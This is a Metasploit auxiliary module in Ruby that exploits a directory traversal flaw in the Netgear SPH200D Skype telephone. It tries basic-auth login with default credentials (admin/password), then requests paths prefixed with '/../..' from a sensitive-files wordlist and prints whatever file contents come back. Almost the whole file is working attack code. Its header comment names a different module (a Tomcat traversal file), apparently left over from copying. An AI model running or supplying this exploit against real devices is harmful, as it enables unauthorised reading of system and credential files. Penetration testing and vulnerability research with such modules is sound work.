##
# $Id: tomcat_utf8_traversal.rb 14975 2012-03-18 01:39:05Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanServer
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Netgear SPH200D - Directory Traversal Vulnerability',
			'Version'     => '$$',
			'Description' => %q{
				This module exploits a directory traversal vulnerablity which is present
				in Netgear SPH200D Skype telephone 
				You may wish to change SENSITIVE_FILES (hosts sensitive files), RPORT depending 
				on your environment.
				},
			'References'  =>
				[
					[ 'URL', 'http://support.netgear.com/product/SPH200D' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-002' ],
				],
			'Author'      => [ 'm-1-k-3' ],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(80),
				OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "sensitive_files.txt") ]),
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),

			], self.class)
	end

	def extract_words(wordfile)
		return [] unless wordfile && File.readable?(wordfile)
		begin
			words = File.open(wordfile, "rb") do |f|
				f.read
		end
		rescue
			return []
		end
		save_array = words.split(/\r?\n/)
		return save_array
	end

	def find_files(files,user,pass)
		traversal = '/../..'

		res = send_request_raw(
			{
				'method'  => 'GET',
				'uri'     => traversal << files,
				'basic_auth' => "#{user}:#{pass}"
				})
		if (res and res.code == 200)
			print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n")
			print_status("#{res.body}")
		elsif (res and res.code)
			vprint_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
		end
	end

	def run_host(ip)
		user = datastore['USERNAME']
		if datastore['PASSWORD'].nil?
			pass = ""
		else
			pass = datastore['PASSWORD']
		end

				print_status("Trying to login with #{user} / #{pass}")

                begin
                        res = send_request_cgi({
                                'uri'     => '/',
                                'method'  => 'GET',
						  		'basic_auth' => "#{user}:#{pass}"
								})

						unless (res.kind_of? Rex::Proto::Http::Response)
								vprint_error("#{target_url} not responding")
						end

						return :abort if (res.code == 404)

						if [200, 301, 302].include?(res.code)
							print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")	
						else
							print_error("NO SUCCESSFUL LOGIN POSSIBLE. '#{user}' : '#{pass}'")	
							return :abort
						end

				rescue ::Rex::ConnectionError
						vprint_error("Failed to connect to the web server")
						return :abort
				end

		begin
			print_status("Attempting to connect to #{rhost}:#{rport}")
			res = send_request_raw(
				{
					'method'  => 'GET',
					'uri'	 => '/',
					'basic_auth' => "#{user}:#{pass}"
				})

			if (res)
				extract_words(datastore['SENSITIVE_FILES']).each do |files|
					find_files(files,user,pass) unless files.empty?
				end
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
